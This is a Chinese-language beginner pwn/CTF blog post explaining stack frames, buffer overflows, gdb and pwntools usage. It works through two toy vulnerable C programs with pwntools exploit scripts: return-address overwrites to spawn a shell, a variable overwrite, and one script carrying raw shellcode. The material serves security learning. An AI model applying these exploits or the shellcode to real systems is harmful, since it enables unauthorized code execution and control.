---
title: PWN入门（二）
date: 2018-07-07 13:23:05
tags: [ctf, pwn]
---

初涉 PWN。

<!-- more -->

# 关于 PWN 底层的原理

## 栈帧平衡

一些基本内容：

- ESP：栈指针寄存器，存放一个指针，该指针永远指向系统栈最上面的栈帧的栈顶
- EBP：基址指针寄存器，该指针永远指向系统栈最上面的栈帧的底部
- 函数栈帧：ESP 和 EBP 之间内存空间为当前栈帧

在函数栈帧中一般包含以下几种信息：

- 局部变量：为函数举报变量开辟的内存空间
- 栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡得到）
- 函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置

如何保证栈帧平衡：

```asm
PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值
MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧

XXXXXX // 函数中间部分

MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间
POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧
```

![](/pics/BIN集训/PWN/二/1.jpg)

函数返回的步骤：

1. 保存返回值，通常将函数的返回值保存在寄存器 EAX 中。
2. 弹出当前帧，恢复上一个栈帧。具体包括：<1> 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。<2> 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。<3> 将函数返回地址弹给 EIP 寄存器。
3. 跳转：按照函数返回地址跳回母函数中继续执行。

![](/pics/BIN集训/PWN/二/2.png)

PS：栈的守护天使——GS，也称作 Stack Canary/Cookie

## 调用函数（Call）

CALL 可以化为两部分，即 `Push retaddr + Jump`。先讲函数返回的地址入栈，再跳转到函数执行的位置处。

## 返回值（Ret）

RET 也可以转化为两部分，即 `Pop retaddr + Jump`。先是把返回值的地址出栈，再跳转回原本调用函数处。

# 缓冲区溢出（Buffer Overflow）

缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。

尤其是 C 语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C 语言中的 C 标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。

# Linux 下的 Pwn 常用命令

|   命令   |                     功能                      |
| :------: | :-------------------------------------------: |
|    cd    |                  进入文件夹                   |
|    ls    |           列出当前目录下的所有文件            |
|  mkdir   |                  创建文件夹                   |
|   pwd    |               显示当前所在目录                |
|  chmod   |               改变文件使用权限                |
| objdump  |    查看目标文件或者可执行的目标文件的构成     |
|   gdb    |               使用 gdb 进行调试               |
| checksec | 检测二进制的保护机制是否开启（peda 中的命令） |

# Linux 下的 Pwn 常用到的工具

- gdb：Linux 调试中必要用到的
- gdb-peda：gdb 方便调试的工具，类似的工具有 gef，gdbinit，这些工具的安装可以参考：http://blog.csdn.net/gatieme/article/details/63254211
- pwntools：写 exp 和 poc 的利器
- checksec：可以很方便的知道 elf 程序的安全性和程序的运行平台
- objdump 和 readelf：可以很快的知道 elf 程序中的关键信息
- ida pro：强大的反编译工具
- ROPgadget：强大的 rop 利用工具
- one_gadget：可以快速的寻找 libc 中的调用 exec('bin/sh')的位置
- libc-database：可以通过泄露的 libc 的某个函数地址查出远程系统是用的哪个 libc 版本

# gdb 基本命令

| 命令  |               功能               |
| :---: | :------------------------------: |
| start |             开始调试             |
| pattc |          生成规律字符串          |
| patto |            查找字符串            |
|   q   |               退出               |
|   n   |  执行一行源代码但不进入函数内部  |
|  ni   | 执行一行汇编代码但不进入函数内部 |
|   s   |  执行一行源代码而且进入函数内部  |
|  si   | 执行一行汇编代码而且进入函数内部 |
|   c   |       继续执行到下一个断点       |
|   b   |              下断点              |
| stack |            显示栈信息            |
|   x   |    按十六进制格式显示内存数据    |
|   r   |             运行代码             |

# Pwntools 基本函数

|      函数      |             功能              |
| :------------: | :---------------------------: |
|   process()    |
|   sendline()   |     向目标发送一行字符串      |
| interactive()  |     实现和程序之间的交互      |
|    remote()    |           远程连接            |
|   context()    |        设置运行时变量         |
|  p32()/p64()   | 把整数转化为 32/64 位的字符串 |
|  u32()/u64()   |  把 32/64 位字符串转化成整数  |
| asm()/disasm() |        快速汇编/反汇编        |
|     log()      |           输出消息            |

# Pwn 的小练习

第一次做 pwn 题，虽然是在有源码的情况下。但是还是被 pwn 的神奇所震撼。

## p1

程序源码：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void vmd()
{
	system("sh");
}
void A()
{
	char a[100];
	scanf("%s",a);
	return;
}
int main(){
	A();
}
```

输入 `gcc p1.c -o p1 -m32`，用来编译 32 位的程序。

### 直接覆盖返回地址

根据源文件可以判断该程序调用 `A()` 函数时，在 scanf 中没有对字符串的长度做限制，即存在缓冲区溢出。

根据源码，本题的思路应该为通过缓冲区溢出，将 RET 处的地址修改为 `cmd()` 函数的地址，直接跳转到该函数后 getshell。故先通过 `objdump` 命令寻找到 cmd 函数的地址

![](/pics/BIN集训/PWN/二/3.png)

然后输入 `gdb p1` 进入 gdb 调试界面。`start` 开始调试程序。

![](/pics/BIN集训/PWN/二/4.png)

![](/pics/BIN集训/PWN/二/5.png)

![](/pics/BIN集训/PWN/二/6.png)

![](/pics/BIN集训/PWN/二/7.png)

![](/pics/BIN集训/PWN/二/8.png)

已知偏移量为 112 后，容易知道可以直接通过溢出在 RET 处覆盖原本的地址，直接跳至 `cmd()` 函数处。

payload 如下：

```python
from pwn import *
payload = "A" * 112 + "\x6b\x84\x04\x08"
p = process("./p1")
p.sendline(payload)
p.interactive()
```

### **Ret_slide**

在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置 payload 减少尝试次数。即 RET 前的字符串利用其他 RET 地址来填充。

因为 RET 相当于 POP 和 JMP 两个步骤，每次 RET 都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。

payload：

```python
from pwn import *
payload = "\x08\x04\x84\xa0" * 28 + "\x6b\x84\x04\x08"
p = process("./p1")
p.sendline(payload)
p.interactive()
```

## 3-13

程序源码：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void A()
{
    setvbuf(stdout, 0, _IONBF, 0);
    srand(time(0) ^ getpid());
    char buf[100];
    int magic = rand();
    gets(buf);
    if (atoi(buf) == magic) {
        puts("Okay...");
        system("sh");
    }
}
int main(){
    A();
}
```

同样输入 `gcc 3-13.c -o 3-13 -m32` 来编译。

调试一开始发现权限不够，通过 `chmod +x 3-13` 来获得可执行权限。

![](/pics/BIN集训/PWN/二/9.png)

源代码中使用了 `gets()` 函数，存在缓存区溢出，故第一个想法应该就是通过对变量 `buf` 操作使其覆盖变量 `magic` 的值，使两者相同后得到 shell。

`buf` 被定义为一个占 100 字节的字符串，而 `magic` 被定义为一个占 4 字节的整型。

![](/pics/BIN集训/PWN/二/10.png)

根据调试过程可以知道，`buf` 的地址为 0xffffcf68，而 `magic` 的地址为 0xffffcfcc。`buf` 的地址比 `magic` 的地址更低，两者在栈中显然是先压入 `magic` 再压入 `buf`。又因为输入数据是从低位向高位输入，那么我们可以通过变化 `buf` 的值来覆盖 `magic` 的值。最简单的方法显然是让两者都等于零。

根据以上的推测，那么输入字符串的长度应当至少为 100+4=104 字节才可能完全覆盖变量 `magic`。

故 payload 为：

```python
from pwn import *
p = process('./3-13')
payload = '\0' * 104
p.sendline(payload)
p.interactive()
```

这里的 `\0` 也就是 `\x00`，而如果输入的是字符 `0`，转为十六进制后为 `\x30`，将不能满足条件，无法 getshell。

这题附上梅大佬的 payload，这里可以放 shellcode：

```python
from pwn import *
offset=116
r=process("3-13")
elf=ELF("3-13")
bss=elf.bss()
get=elf.symbols['gets']
shell="\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c"
payload="A"*offset+p32(get)+p32(bss)+p32(bss)
r.sendline(payload)
r.sendline(shell)
r.sendline('/bin/sh')
r.interactive()
```

# 参考网站

https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA
https://paper.seebug.org/481/
https://bbs.pediy.com/thread-212691.htm
http://blog.xiyoulinux.org/detail.jsp?id=1965
http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html
https://blog.csdn.net/qq_29343201/article/details/51337025
http://www.91ri.org/14382.html
